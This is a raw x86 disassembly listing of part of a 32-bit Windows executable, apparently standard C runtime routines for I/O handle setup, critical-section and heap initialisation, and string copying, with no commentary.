  423542:	jmp    0x42354f
  423544:	push   ebp
  423545:	push   esi
  423546:	push   edi
  423547:	call   0x424690
  42354c:	add    esp,0xc
  42354f:	push   esi
  423550:	call   DWORD PTR ds:0x428084
  423556:	mov    eax,edi
  423558:	pop    edi
  423559:	pop    esi
  42355a:	pop    ebp
  42355b:	pop    ebx
  42355c:	pop    ecx
  42355d:	pop    ecx
  42355e:	ret    
  42355f:	sub    esp,0x48
  423562:	push   ebx
  423563:	mov    ebx,0x480
  423568:	push   ebx
  423569:	call   0x424672
  42356e:	test   eax,eax
  423570:	pop    ecx
  423571:	jne    0x42357b
  423573:	or     eax,0xffffffff
  423576:	jmp    0x423758
  42357b:	mov    ds:0x4663a0,eax
  423580:	mov    DWORD PTR ds:0x466388,0x20
  42358a:	lea    ecx,[eax+0x480]
  423590:	jmp    0x4235b0
  423592:	and    BYTE PTR [eax+0x4],0x0
  423596:	or     DWORD PTR [eax],0xffffffff
  423599:	and    DWORD PTR [eax+0x8],0x0
  42359d:	mov    BYTE PTR [eax+0x5],0xa
  4235a1:	mov    ecx,DWORD PTR ds:0x4663a0
  4235a7:	add    eax,0x24
  4235aa:	add    ecx,0x480
  4235b0:	cmp    eax,ecx
  4235b2:	jb     0x423592
  4235b4:	push   ebp
  4235b5:	push   esi
  4235b6:	push   edi
  4235b7:	lea    eax,[esp+0x14]
  4235bb:	push   eax
  4235bc:	call   DWORD PTR ds:0x42805c
  4235c2:	cmp    WORD PTR [esp+0x46],0x0
  4235c8:	je     0x4236b7
  4235ce:	mov    eax,DWORD PTR [esp+0x48]
  4235d2:	test   eax,eax
  4235d4:	je     0x4236b7
  4235da:	mov    edi,DWORD PTR [eax]
  4235dc:	lea    ebp,[eax+0x4]
  4235df:	lea    eax,[edi+ebp*1]
  4235e2:	mov    DWORD PTR [esp+0x10],eax
  4235e6:	mov    eax,0x800
  4235eb:	cmp    edi,eax
  4235ed:	jl     0x4235f1
  4235ef:	mov    edi,eax
  4235f1:	cmp    DWORD PTR ds:0x466388,edi
  4235f7:	jge    0x423647
  4235f9:	mov    esi,0x4663a4
  4235fe:	push   ebx
  4235ff:	call   0x424672
  423604:	test   eax,eax
  423606:	pop    ecx
  423607:	je     0x423641
  423609:	add    DWORD PTR ds:0x466388,0x20
  423610:	mov    DWORD PTR [esi],eax
  423612:	lea    ecx,[eax+0x480]
  423618:	jmp    0x423630
  42361a:	and    BYTE PTR [eax+0x4],0x0
  42361e:	or     DWORD PTR [eax],0xffffffff
  423621:	and    DWORD PTR [eax+0x8],0x0
  423625:	mov    BYTE PTR [eax+0x5],0xa
  423629:	mov    ecx,DWORD PTR [esi]
  42362b:	add    eax,0x24
  42362e:	add    ecx,ebx
  423630:	cmp    eax,ecx
  423632:	jb     0x42361a
  423634:	add    esi,0x4
  423637:	cmp    DWORD PTR ds:0x466388,edi
  42363d:	jl     0x4235fe
  42363f:	jmp    0x423647
  423641:	mov    edi,DWORD PTR ds:0x466388
  423647:	xor    ebx,ebx
  423649:	test   edi,edi
  42364b:	jle    0x4236b7
  42364d:	mov    eax,DWORD PTR [esp+0x10]
  423651:	mov    eax,DWORD PTR [eax]
  423653:	cmp    eax,0xffffffff
  423656:	je     0x4236ac
  423658:	mov    cl,BYTE PTR [ebp+0x0]
  42365b:	test   cl,0x1
  42365e:	je     0x4236ac
  423660:	test   cl,0x8
  423663:	jne    0x423670
  423665:	push   eax
  423666:	call   DWORD PTR ds:0x42809c
  42366c:	test   eax,eax
  42366e:	je     0x4236ac
  423670:	mov    ecx,ebx
  423672:	mov    eax,ebx
  423674:	and    eax,0x1f
  423677:	lea    eax,[eax+eax*8]
  42367a:	sar    ecx,0x5
  42367d:	mov    ecx,DWORD PTR [ecx*4+0x4663a0]
  423684:	lea    esi,[ecx+eax*4]
  423687:	mov    eax,DWORD PTR [esp+0x10]
  42368b:	mov    eax,DWORD PTR [eax]
  42368d:	mov    DWORD PTR [esi],eax
  42368f:	mov    al,BYTE PTR [ebp+0x0]
  423692:	mov    BYTE PTR [esi+0x4],al
  423695:	lea    eax,[esi+0xc]
  423698:	push   0xfa0
  42369d:	push   eax
  42369e:	call   0x4249dd
  4236a3:	test   eax,eax
  4236a5:	pop    ecx
  4236a6:	pop    ecx
  4236a7:	je     0x4236d7
  4236a9:	inc    DWORD PTR [esi+0x8]
  4236ac:	add    DWORD PTR [esp+0x10],0x4
  4236b1:	inc    ebx
  4236b2:	inc    ebp
  4236b3:	cmp    ebx,edi
  4236b5:	jl     0x42364d
  4236b7:	xor    ebx,ebx
  4236b9:	mov    ecx,DWORD PTR ds:0x4663a0
  4236bf:	lea    eax,[ebx+ebx*8]
  4236c2:	lea    esi,[ecx+eax*4]
  4236c5:	cmp    DWORD PTR [esi],0xffffffff
  4236c8:	jne    0x423739
  4236ca:	test   ebx,ebx
  4236cc:	mov    BYTE PTR [esi+0x4],0x81
  4236d0:	jne    0x4236dc
  4236d2:	push   0xfffffff6
  4236d4:	pop    eax
  4236d5:	jmp    0x4236e6
  4236d7:	or     eax,0xffffffff
  4236da:	jmp    0x423755
  4236dc:	mov    eax,ebx
  4236de:	dec    eax
  4236df:	neg    eax
  4236e1:	sbb    eax,eax
  4236e3:	add    eax,0xfffffff5
  4236e6:	push   eax
  4236e7:	call   DWORD PTR ds:0x428078
  4236ed:	mov    edi,eax
  4236ef:	cmp    edi,0xffffffff
  4236f2:	je     0x423733
  4236f4:	push   edi
  4236f5:	call   DWORD PTR ds:0x42809c
  4236fb:	test   eax,eax
  4236fd:	je     0x423733
  4236ff:	and    eax,0xff
  423704:	cmp    eax,0x2
  423707:	mov    DWORD PTR [esi],edi
  423709:	jne    0x423711
  42370b:	or     BYTE PTR [esi+0x4],0x40
  42370f:	jmp    0x42371a
  423711:	cmp    eax,0x3
  423714:	jne    0x42371a
  423716:	or     BYTE PTR [esi+0x4],0x8
  42371a:	lea    eax,[esi+0xc]
  42371d:	push   0xfa0
  423722:	push   eax
  423723:	call   0x4249dd
  423728:	test   eax,eax
  42372a:	pop    ecx
  42372b:	pop    ecx
  42372c:	je     0x4236d7
  42372e:	inc    DWORD PTR [esi+0x8]
  423731:	jmp    0x42373d
  423733:	or     BYTE PTR [esi+0x4],0x40
  423737:	jmp    0x42373d
  423739:	or     BYTE PTR [esi+0x4],0x80
  42373d:	inc    ebx
  42373e:	cmp    ebx,0x3
  423741:	jl     0x4236b9
  423747:	push   DWORD PTR ds:0x466388
  42374d:	call   DWORD PTR ds:0x428098
  423753:	xor    eax,eax
  423755:	pop    edi
  423756:	pop    esi
  423757:	pop    ebp
  423758:	pop    ebx
  423759:	add    esp,0x48
  42375c:	ret    
  42375d:	push   0xc
  42375f:	push   0x4284f0
  423764:	call   0x423950
  423769:	mov    DWORD PTR [ebp-0x1c],0x428f48
  423770:	cmp    DWORD PTR [ebp-0x1c],0x428f48
  423777:	jae    0x42379b
  423779:	and    DWORD PTR [ebp-0x4],0x0
  42377d:	mov    eax,DWORD PTR [ebp-0x1c]
  423780:	mov    eax,DWORD PTR [eax]
  423782:	test   eax,eax
  423784:	je     0x423791
  423786:	call   eax
  423788:	jmp    0x423791
  42378a:	xor    eax,eax
  42378c:	inc    eax
  42378d:	ret    
  42378e:	mov    esp,DWORD PTR [ebp-0x18]
  423791:	or     DWORD PTR [ebp-0x4],0xffffffff
  423795:	add    DWORD PTR [ebp-0x1c],0x4
  423799:	jmp    0x423770
  42379b:	call   0x42398b
  4237a0:	ret    
  4237a1:	push   0xc
  4237a3:	push   0x428500
  4237a8:	call   0x423950
  4237ad:	mov    DWORD PTR [ebp-0x1c],0x428f50
  4237b4:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  4237bb:	jae    0x4237df
  4237bd:	and    DWORD PTR [ebp-0x4],0x0
  4237c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237c4:	mov    eax,DWORD PTR [eax]
  4237c6:	test   eax,eax
  4237c8:	je     0x4237d5
  4237ca:	call   eax
  4237cc:	jmp    0x4237d5
  4237ce:	xor    eax,eax
  4237d0:	inc    eax
  4237d1:	ret    
  4237d2:	mov    esp,DWORD PTR [ebp-0x18]
  4237d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237d9:	add    DWORD PTR [ebp-0x1c],0x4
  4237dd:	jmp    0x4237b4
  4237df:	call   0x42398b
  4237e4:	ret    
  4237e5:	call   0x423a26
  4237ea:	mov    eax,ds:0x46552c
  4237ef:	cmp    eax,0xffffffff
  4237f2:	je     0x423802
  4237f4:	push   eax
  4237f5:	call   DWORD PTR ds:0x4280a4
  4237fb:	or     DWORD PTR ds:0x46552c,0xffffffff
  423802:	ret    
  423803:	push   ebx
  423804:	push   esi
  423805:	call   DWORD PTR ds:0x42803c
  42380b:	push   DWORD PTR ds:0x46552c
  423811:	mov    ebx,eax
  423813:	call   DWORD PTR ds:0x4280b0
  423819:	mov    esi,eax
  42381b:	test   esi,esi
  42381d:	jne    0x423868
  42381f:	push   0x88
  423824:	push   0x1
  423826:	call   0x424a68
  42382b:	mov    esi,eax
  42382d:	test   esi,esi
  42382f:	pop    ecx
  423830:	pop    ecx
  423831:	je     0x423860
  423833:	push   esi
  423834:	push   DWORD PTR ds:0x46552c
  42383a:	call   DWORD PTR ds:0x4280ac
  423840:	test   eax,eax
  423842:	je     0x423860
  423844:	mov    DWORD PTR [esi+0x54],0x465480
  42384b:	mov    DWORD PTR [esi+0x14],0x1
  423852:	call   DWORD PTR ds:0x428020
  423858:	or     DWORD PTR [esi+0x4],0xffffffff
  42385c:	mov    DWORD PTR [esi],eax
  42385e:	jmp    0x423868
  423860:	push   0x10
  423862:	call   0x422a16
  423867:	pop    ecx
  423868:	push   ebx
  423869:	call   DWORD PTR ds:0x4280a8
  42386f:	mov    eax,esi
  423871:	pop    esi
  423872:	pop    ebx
  423873:	ret    
  423874:	call   0x4239dd
  423879:	test   eax,eax
  42387b:	je     0x42388d
  42387d:	call   DWORD PTR ds:0x4280b4
  423883:	cmp    eax,0xffffffff
  423886:	mov    ds:0x46552c,eax
  42388b:	jne    0x423895
  42388d:	call   0x4237e5
  423892:	xor    eax,eax
  423894:	ret    
  423895:	push   esi
  423896:	push   0x88
  42389b:	push   0x1
  42389d:	call   0x424a68
  4238a2:	mov    esi,eax
  4238a4:	test   esi,esi
  4238a6:	pop    ecx
  4238a7:	pop    ecx
  4238a8:	je     0x4238da
  4238aa:	push   esi
  4238ab:	push   DWORD PTR ds:0x46552c
  4238b1:	call   DWORD PTR ds:0x4280ac
  4238b7:	test   eax,eax
  4238b9:	je     0x4238da
  4238bb:	mov    DWORD PTR [esi+0x54],0x465480
  4238c2:	mov    DWORD PTR [esi+0x14],0x1
  4238c9:	call   DWORD PTR ds:0x428020
  4238cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238d3:	mov    DWORD PTR [esi],eax
  4238d5:	xor    eax,eax
  4238d7:	inc    eax
  4238d8:	pop    esi
  4238d9:	ret    
  4238da:	call   0x4237e5
  4238df:	xor    eax,eax
  4238e1:	pop    esi
  4238e2:	ret    
  4238e3:	cmp    DWORD PTR ds:0x465d04,0x2
  4238ea:	jne    0x4238f9
  4238ec:	cmp    DWORD PTR ds:0x465d10,0x5
  4238f3:	jb     0x4238f9
  4238f5:	xor    eax,eax
  4238f7:	inc    eax
  4238f8:	ret    
  4238f9:	push   0x3
  4238fb:	pop    eax
  4238fc:	ret    
  4238fd:	xor    eax,eax
  4238ff:	cmp    DWORD PTR [esp+0x4],eax
  423903:	push   0x0
  423905:	sete   al
  423908:	push   0x1000
  42390d:	push   eax
  42390e:	call   DWORD PTR ds:0x4280bc
  423914:	test   eax,eax
  423916:	mov    ds:0x466380,eax
  42391b:	je     0x423947
  42391d:	call   0x4238e3
  423922:	cmp    eax,0x3
  423925:	mov    ds:0x466384,eax
  42392a:	jne    0x42394a
  42392c:	push   0x3f8
  423931:	call   0x424cea
  423936:	test   eax,eax
  423938:	pop    ecx
  423939:	jne    0x42394a
  42393b:	push   DWORD PTR ds:0x466380
  423941:	call   DWORD PTR ds:0x4280b8
  423947:	xor    eax,eax
  423949:	ret    
  42394a:	xor    eax,eax
  42394c:	inc    eax
  42394d:	ret    
  42394e:	int3   
  42394f:	int3   
  423950:	push   0x425818
  423955:	mov    eax,fs:0x0
  42395b:	push   eax
  42395c:	mov    eax,DWORD PTR [esp+0x10]
  423960:	mov    DWORD PTR [esp+0x10],ebp
  423964:	lea    ebp,[esp+0x10]
  423968:	sub    esp,eax
  42396a:	push   ebx
  42396b:	push   esi
  42396c:	push   edi
  42396d:	mov    eax,DWORD PTR [ebp-0x8]
  423970:	mov    DWORD PTR [ebp-0x18],esp
  423973:	push   eax
  423974:	mov    eax,DWORD PTR [ebp-0x4]
  423977:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42397e:	mov    DWORD PTR [ebp-0x8],eax
  423981:	lea    eax,[ebp-0x10]
  423984:	mov    fs:0x0,eax
  42398a:	ret    
  42398b:	mov    ecx,DWORD PTR [ebp-0x10]
  42398e:	mov    DWORD PTR fs:0x0,ecx
  423995:	pop    ecx
  423996:	pop    edi
  423997:	pop    esi
  423998:	pop    ebx
  423999:	leave  
  42399a:	push   ecx
  42399b:	ret    
  42399c:	int3   
  42399d:	int3   
  42399e:	int3   
  42399f:	int3   
  4239a0:	cmp    eax,0x1000
  4239a5:	jae    0x4239b5
  4239a7:	neg    eax
  4239a9:	add    eax,esp
  4239ab:	add    eax,0x4
  4239ae:	test   DWORD PTR [eax],eax
  4239b0:	xchg   esp,eax
  4239b1:	mov    eax,DWORD PTR [eax]
  4239b3:	push   eax
  4239b4:	ret    
  4239b5:	push   ecx
  4239b6:	lea    ecx,[esp+0x8]
  4239ba:	sub    ecx,0x1000
  4239c0:	sub    eax,0x1000
  4239c5:	test   DWORD PTR [ecx],eax
  4239c7:	cmp    eax,0x1000
  4239cc:	jae    0x4239ba
  4239ce:	sub    ecx,eax
  4239d0:	mov    eax,esp
  4239d2:	test   DWORD PTR [ecx],eax
  4239d4:	mov    esp,ecx
  4239d6:	mov    ecx,DWORD PTR [eax]
  4239d8:	mov    eax,DWORD PTR [eax+0x4]
  4239db:	push   eax
  4239dc:	ret    
  4239dd:	push   esi
  4239de:	push   edi
  4239df:	xor    esi,esi
  4239e1:	mov    edi,0x465e60
  4239e6:	cmp    DWORD PTR [esi*8+0x465544],0x1
  4239ee:	jne    0x423a0e
  4239f0:	lea    eax,[esi*8+0x465540]
  4239f7:	mov    DWORD PTR [eax],edi
  4239f9:	push   0xfa0
  4239fe:	push   DWORD PTR [eax]
  423a00:	add    edi,0x18
  423a03:	call   0x4249dd
  423a08:	test   eax,eax
  423a0a:	pop    ecx
  423a0b:	pop    ecx
  423a0c:	je     0x423a1a
  423a0e:	inc    esi
  423a0f:	cmp    esi,0x24
  423a12:	jl     0x4239e6
  423a14:	xor    eax,eax
  423a16:	inc    eax
  423a17:	pop    edi
  423a18:	pop    esi
  423a19:	ret    
  423a1a:	and    DWORD PTR [esi*8+0x465540],0x0
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a17
  423a26:	push   ebx
  423a27:	mov    ebx,DWORD PTR ds:0x4280a0
  423a2d:	push   esi
  423a2e:	mov    esi,0x465540
  423a33:	push   edi
  423a34:	mov    edi,DWORD PTR [esi]
  423a36:	test   edi,edi
  423a38:	je     0x423a4d
  423a3a:	cmp    DWORD PTR [esi+0x4],0x1
  423a3e:	je     0x423a4d
  423a40:	push   edi
  423a41:	call   ebx
  423a43:	push   edi
  423a44:	call   0x42455a
  423a49:	and    DWORD PTR [esi],0x0
  423a4c:	pop    ecx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x465660
  423a56:	jl     0x423a34
  423a58:	mov    esi,0x465540
  423a5d:	pop    edi
  423a5e:	mov    eax,DWORD PTR [esi]
  423a60:	test   eax,eax
  423a62:	je     0x423a6d
  423a64:	cmp    DWORD PTR [esi+0x4],0x1
  423a68:	jne    0x423a6d
  423a6a:	push   eax
  423a6b:	call   ebx
  423a6d:	add    esi,0x8
  423a70:	cmp    esi,0x465660
  423a76:	jl     0x423a5e
  423a78:	pop    esi
  423a79:	pop    ebx
  423a7a:	ret    
  423a7b:	push   ebp
  423a7c:	mov    ebp,esp
  423a7e:	mov    eax,DWORD PTR [ebp+0x8]
  423a81:	push   DWORD PTR [eax*8+0x465540]
  423a88:	call   DWORD PTR ds:0x4280c8
  423a8e:	pop    ebp
  423a8f:	ret    
  423a90:	push   ebp
  423a91:	mov    ebp,esp
  423a93:	push   esi
  423a94:	mov    esi,DWORD PTR [ebp+0x8]
  423a97:	lea    esi,[esi*8+0x465540]
  423a9e:	cmp    DWORD PTR [esi],0x0
  423aa1:	je     0x423aa8
  423aa3:	xor    eax,eax
  423aa5:	inc    eax
  423aa6:	jmp    0x423b0c
  423aa8:	push   edi
  423aa9:	push   0x18
  423aab:	call   0x424672
  423ab0:	mov    edi,eax
  423ab2:	test   edi,edi
  423ab4:	pop    ecx
  423ab5:	jne    0x423ac6
  423ab7:	call   0x4258f0
  423abc:	mov    DWORD PTR [eax],0xc
  423ac2:	xor    eax,eax
  423ac4:	jmp    0x423b0b
  423ac6:	push   0xa
  423ac8:	call   0x423b0f
  423acd:	cmp    DWORD PTR [esi],0x0
  423ad0:	pop    ecx
  423ad1:	jne    0x423af9
  423ad3:	push   0xfa0
  423ad8:	push   edi
  423ad9:	call   0x4249dd
  423ade:	test   eax,eax
  423ae0:	pop    ecx
  423ae1:	pop    ecx
  423ae2:	jne    0x423af5
  423ae4:	push   edi
  423ae5:	call   0x42455a
  423aea:	push   0xa
  423aec:	call   0x423a7b
  423af1:	pop    ecx
  423af2:	pop    ecx
  423af3:	jmp    0x423ab7
  423af5:	mov    DWORD PTR [esi],edi
  423af7:	jmp    0x423b00
  423af9:	push   edi
  423afa:	call   0x42455a
  423aff:	pop    ecx
  423b00:	push   0xa
  423b02:	call   0x423a7b
  423b07:	xor    eax,eax
  423b09:	pop    ecx
  423b0a:	inc    eax
  423b0b:	pop    edi
  423b0c:	pop    esi
  423b0d:	pop    ebp
  423b0e:	ret    
  423b0f:	push   ebp
  423b10:	mov    ebp,esp
  423b12:	mov    eax,DWORD PTR [ebp+0x8]
  423b15:	push   esi
  423b16:	lea    esi,[eax*8+0x465540]
  423b1d:	cmp    DWORD PTR [esi],0x0
  423b20:	jne    0x423b35
  423b22:	push   eax
  423b23:	call   0x423a90
  423b28:	test   eax,eax
  423b2a:	pop    ecx
  423b2b:	jne    0x423b35
  423b2d:	push   0x11
  423b2f:	call   0x422a16
  423b34:	pop    ecx
  423b35:	push   DWORD PTR [esi]
  423b37:	call   DWORD PTR ds:0x4280cc
  423b3d:	pop    esi
  423b3e:	pop    ebp
  423b3f:	ret    
  423b40:	push   esi
  423b41:	push   DWORD PTR ds:0x4664a8
  423b47:	call   0x425aa6
  423b4c:	pop    ecx
  423b4d:	mov    ecx,DWORD PTR ds:0x4664a4
  423b53:	mov    esi,eax
  423b55:	mov    eax,ds:0x4664a8
  423b5a:	mov    edx,ecx
  423b5c:	sub    edx,eax
  423b5e:	add    edx,0x4
  423b61:	cmp    esi,edx
  423b63:	jae    0x423bb3
  423b65:	mov    ecx,0x800
  423b6a:	cmp    esi,ecx
  423b6c:	jae    0x423b70
  423b6e:	mov    ecx,esi
  423b70:	add    ecx,esi
  423b72:	push   ecx
  423b73:	push   eax
  423b74:	call   0x4258f9
  423b79:	test   eax,eax
  423b7b:	pop    ecx
  423b7c:	pop    ecx
  423b7d:	jne    0x423b96
  423b7f:	add    esi,0x10
  423b82:	push   esi
  423b83:	push   DWORD PTR ds:0x4664a8
  423b89:	call   0x4258f9
  423b8e:	test   eax,eax
  423b90:	pop    ecx
  423b91:	pop    ecx
  423b92:	jne    0x423b96
  423b94:	pop    esi
  423b95:	ret    
  423b96:	mov    ecx,DWORD PTR ds:0x4664a4
  423b9c:	sub    ecx,DWORD PTR ds:0x4664a8
  423ba2:	mov    ds:0x4664a8,eax
  423ba7:	sar    ecx,0x2
  423baa:	lea    ecx,[eax+ecx*4]
  423bad:	mov    DWORD PTR ds:0x4664a4,ecx
  423bb3:	mov    DWORD PTR [ecx],edi
  423bb5:	add    DWORD PTR ds:0x4664a4,0x4
  423bbc:	mov    eax,edi
  423bbe:	pop    esi
  423bbf:	ret    
  423bc0:	push   0x80
  423bc5:	call   0x424672
  423bca:	test   eax,eax
  423bcc:	pop    ecx
  423bcd:	mov    ds:0x4664a8,eax
  423bd2:	jne    0x423bd8
  423bd4:	push   0x18
  423bd6:	pop    eax
  423bd7:	ret    
  423bd8:	and    DWORD PTR [eax],0x0
  423bdb:	mov    eax,ds:0x4664a8
  423be0:	mov    ds:0x4664a4,eax
  423be5:	xor    eax,eax
  423be7:	ret    
  423be8:	push   0xc
  423bea:	push   0x428510
  423bef:	call   0x423950
  423bf4:	call   0x422c61
  423bf9:	and    DWORD PTR [ebp-0x4],0x0
  423bfd:	mov    edi,DWORD PTR [ebp+0x8]
  423c00:	call   0x423b40
  423c05:	mov    DWORD PTR [ebp-0x1c],eax
  423c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  423c0c:	call   0x423c1a
  423c11:	mov    eax,DWORD PTR [ebp-0x1c]
  423c14:	call   0x42398b
  423c19:	ret    
  423c1a:	call   0x422c6a
  423c1f:	ret    
  423c20:	push   DWORD PTR [esp+0x4]
  423c24:	call   0x423be8
  423c29:	neg    eax
  423c2b:	sbb    eax,eax
  423c2d:	neg    eax
  423c2f:	pop    ecx
  423c30:	dec    eax
  423c31:	ret    
  423c32:	push   ebp
  423c33:	mov    ebp,esp
  423c35:	sub    esp,0x10
  423c38:	push   ebx
  423c39:	xor    ebx,ebx
  423c3b:	cmp    DWORD PTR ds:0x465fb0,ebx
  423c41:	push   esi
  423c42:	push   edi
  423c43:	jne    0x423cb2
  423c45:	push   0x428580
  423c4a:	call   DWORD PTR ds:0x4280d0
  423c50:	mov    edi,eax
  423c52:	cmp    edi,ebx
  423c54:	je     0x423ced
  423c5a:	mov    esi,DWORD PTR ds:0x428040
  423c60:	push   0x428574
  423c65:	push   edi
  423c66:	call   esi
  423c68:	test   eax,eax
  423c6a:	mov    ds:0x465fb0,eax
  423c6f:	je     0x423ced
  423c71:	push   0x428564
  423c76:	push   edi
  423c77:	call   esi
  423c79:	push   0x428550
  423c7e:	push   edi
  423c7f:	mov    ds:0x465fb4,eax
  423c84:	call   esi
  423c86:	cmp    DWORD PTR ds:0x465d04,0x2
  423c8d:	mov    ds:0x465fb8,eax
  423c92:	jne    0x423cb2
  423c94:	push   0x428534
  423c99:	push   edi
  423c9a:	call   esi
  423c9c:	test   eax,eax
  423c9e:	mov    ds:0x465fc0,eax
  423ca3:	je     0x423cb2
  423ca5:	push   0x42851c
  423caa:	push   edi
  423cab:	call   esi
  423cad:	mov    ds:0x465fbc,eax
  423cb2:	mov    eax,ds:0x465fbc
  423cb7:	test   eax,eax
  423cb9:	je     0x423cf7
  423cbb:	call   eax
  423cbd:	test   eax,eax
  423cbf:	je     0x423cde
  423cc1:	lea    ecx,[ebp-0x4]
  423cc4:	push   ecx
  423cc5:	push   0xc
  423cc7:	lea    ecx,[ebp-0x10]
  423cca:	push   ecx
  423ccb:	push   0x1
  423ccd:	push   eax
  423cce:	call   DWORD PTR ds:0x465fc0
  423cd4:	test   eax,eax
  423cd6:	je     0x423cde
  423cd8:	test   BYTE PTR [ebp-0x8],0x1
  423cdc:	jne    0x423cf7
  423cde:	cmp    DWORD PTR ds:0x465d10,0x4
  423ce5:	jb     0x423cf1
  423ce7:	or     BYTE PTR [ebp+0x12],0x20
  423ceb:	jmp    0x423d16
  423ced:	xor    eax,eax
  423cef:	jmp    0x423d26
  423cf1:	or     BYTE PTR [ebp+0x12],0x4
  423cf5:	jmp    0x423d16
  423cf7:	mov    eax,ds:0x465fb4
  423cfc:	test   eax,eax
  423cfe:	je     0x423d16
  423d00:	call   eax
  423d02:	mov    ebx,eax
  423d04:	test   ebx,ebx
  423d06:	je     0x423d16
  423d08:	mov    eax,ds:0x465fb8
  423d0d:	test   eax,eax
  423d0f:	je     0x423d16
  423d11:	push   ebx
  423d12:	call   eax
  423d14:	mov    ebx,eax
  423d16:	push   DWORD PTR [ebp+0x10]
  423d19:	push   DWORD PTR [ebp+0xc]
  423d1c:	push   DWORD PTR [ebp+0x8]
  423d1f:	push   ebx
  423d20:	call   DWORD PTR ds:0x465fb0
  423d26:	pop    edi
  423d27:	pop    esi
  423d28:	pop    ebx
  423d29:	leave  
  423d2a:	ret    
  423d2b:	int3   
  423d2c:	int3   
  423d2d:	int3   
  423d2e:	int3   
  423d2f:	int3   
  423d30:	push   edi
  423d31:	mov    edi,DWORD PTR [esp+0x8]
  423d35:	jmp    0x423da5
  423d37:	lea    esp,[esp+0x0]
  423d3e:	mov    edi,edi
  423d40:	mov    ecx,DWORD PTR [esp+0x4]
  423d44:	push   edi
  423d45:	test   ecx,0x3
  423d4b:	je     0x423d60
  423d4d:	mov    al,BYTE PTR [ecx]
  423d4f:	add    ecx,0x1
  423d52:	test   al,al
  423d54:	je     0x423d93
  423d56:	test   ecx,0x3
  423d5c:	jne    0x423d4d
  423d5e:	mov    edi,edi
  423d60:	mov    eax,DWORD PTR [ecx]
  423d62:	mov    edx,0x7efefeff
  423d67:	add    edx,eax
  423d69:	xor    eax,0xffffffff
  423d6c:	xor    eax,edx
  423d6e:	add    ecx,0x4
  423d71:	test   eax,0x81010100
  423d76:	je     0x423d60
  423d78:	mov    eax,DWORD PTR [ecx-0x4]
  423d7b:	test   al,al
  423d7d:	je     0x423da2
  423d7f:	test   ah,ah
  423d81:	je     0x423d9d
  423d83:	test   eax,0xff0000
  423d88:	je     0x423d98
  423d8a:	test   eax,0xff000000
  423d8f:	je     0x423d93
  423d91:	jmp    0x423d60
  423d93:	lea    edi,[ecx-0x1]
  423d96:	jmp    0x423da5
  423d98:	lea    edi,[ecx-0x2]
  423d9b:	jmp    0x423da5
  423d9d:	lea    edi,[ecx-0x3]
  423da0:	jmp    0x423da5
  423da2:	lea    edi,[ecx-0x4]
  423da5:	mov    ecx,DWORD PTR [esp+0xc]
  423da9:	test   ecx,0x3
  423daf:	je     0x423dce
  423db1:	mov    dl,BYTE PTR [ecx]
  423db3:	add    ecx,0x1
  423db6:	test   dl,dl
  423db8:	je     0x423e20
  423dba:	mov    BYTE PTR [edi],dl
  423dbc:	add    edi,0x1
  423dbf:	test   ecx,0x3
  423dc5:	jne    0x423db1
  423dc7:	jmp    0x423dce
  423dc9:	mov    DWORD PTR [edi],edx
  423dcb:	add    edi,0x4
  423dce:	mov    edx,0x7efefeff
  423dd3:	mov    eax,DWORD PTR [ecx]
  423dd5:	add    edx,eax
  423dd7:	xor    eax,0xffffffff
  423dda:	xor    eax,edx
  423ddc:	mov    edx,DWORD PTR [ecx]
  423dde:	add    ecx,0x4
  423de1:	test   eax,0x81010100
  423de6:	je     0x423dc9
  423de8:	test   dl,dl
  423dea:	je     0x423e20
  423dec:	test   dh,dh
  423dee:	je     0x423e17
  423df0:	test   edx,0xff0000
  423df6:	je     0x423e0a
  423df8:	test   edx,0xff000000
  423dfe:	je     0x423e02
  423e00:	jmp    0x423dc9
  423e02:	mov    DWORD PTR [edi],edx
  423e04:	mov    eax,DWORD PTR [esp+0x8]
  423e08:	pop    edi
  423e09:	ret    
  423e0a:	mov    WORD PTR [edi],dx
  423e0d:	mov    eax,DWORD PTR [esp+0x8]
  423e11:	mov    BYTE PTR [edi+0x2],0x0
  423e15:	pop    edi
  423e16:	ret    
  423e17:	mov    WORD PTR [edi],dx
  423e1a:	mov    eax,DWORD PTR [esp+0x8]
  423e1e:	pop    edi
  423e1f:	ret    
  423e20:	mov    BYTE PTR [edi],dl
  423e22:	mov    eax,DWORD PTR [esp+0x8]
  423e26:	pop    edi
  423e27:	ret    
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	mov    ecx,DWORD PTR [esp+0xc]
  423e34:	push   edi
  423e35:	test   ecx,ecx
  423e37:	je     0x423ecf
  423e3d:	push   esi
  423e3e:	push   ebx
  423e3f:	mov    ebx,ecx
  423e41:	mov    esi,DWORD PTR [esp+0x14]
  423e45:	test   esi,0x3
  423e4b:	mov    edi,DWORD PTR [esp+0x10]
  423e4f:	jne    0x423e5c
  423e51:	shr    ecx,0x2
  423e54:	jne    0x423edf
  423e5a:	jmp    0x423e83
  423e5c:	mov    al,BYTE PTR [esi]
  423e5e:	add    esi,0x1
  423e61:	mov    BYTE PTR [edi],al
  423e63:	add    edi,0x1
  423e66:	sub    ecx,0x1
  423e69:	je     0x423e96
  423e6b:	test   al,al
  423e6d:	je     0x423e9e
  423e6f:	test   esi,0x3
  423e75:	jne    0x423e5c
  423e77:	mov    ebx,ecx
  423e79:	shr    ecx,0x2
  423e7c:	jne    0x423edf
  423e7e:	and    ebx,0x3
  423e81:	je     0x423e96
  423e83:	mov    al,BYTE PTR [esi]
  423e85:	add    esi,0x1
  423e88:	mov    BYTE PTR [edi],al
  423e8a:	add    edi,0x1
  423e8d:	test   al,al
  423e8f:	je     0x423ec8
  423e91:	sub    ebx,0x1
  423e94:	jne    0x423e83
  423e96:	mov    eax,DWORD PTR [esp+0x10]
  423e9a:	pop    ebx
  423e9b:	pop    esi
  423e9c:	pop    edi
  423e9d:	ret    
  423e9e:	test   edi,0x3
  423ea4:	je     0x423ebc
  423ea6:	mov    BYTE PTR [edi],al
  423ea8:	add    edi,0x1
  423eab:	sub    ecx,0x1
  423eae:	je     0x423f4c
  423eb4:	test   edi,0x3
  423eba:	jne    0x423ea6
